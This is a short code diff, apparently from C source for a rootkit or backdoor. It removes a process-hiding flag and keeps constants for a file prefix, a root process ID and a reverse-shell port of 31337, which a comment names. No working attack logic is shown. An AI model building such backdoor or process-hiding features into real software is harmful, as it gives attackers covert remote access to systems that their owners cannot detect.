@@ -3,7 +3,6 @@
 	/*
 	reverse shell port is 31337
 	*/
-	#define PF_INVISIBLE 0x10000000
 	#define BDS_PREFIX "bds_"
 	#define BDS_PORT "31337"
 	#define BDS_ROOT_PID "000"
